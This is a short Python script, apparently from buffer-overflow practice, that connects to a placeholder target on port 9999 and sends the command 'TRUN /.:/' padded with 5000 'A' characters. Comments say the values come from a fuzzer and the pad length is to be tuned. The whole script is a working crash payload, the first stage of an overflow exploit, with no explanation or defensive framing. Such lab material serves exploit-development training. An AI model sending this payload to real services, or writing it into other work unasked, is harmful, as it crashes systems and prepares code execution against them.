#!/usr/bin/python
import socket
ipaddr = "TARGET-IPADDRESS"
cmd = "TRUN /.:/"           # Found from fuzzer
pad = "A" * 5000            # Change value with number from fuzzer
payload = cmd + pad         # Full payload

print("Len = ", (len(payload)))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((ipaddr,9999))

s.send(payload.encode())
print(payload.encode())

print("Sent Successfully!")
s.close()

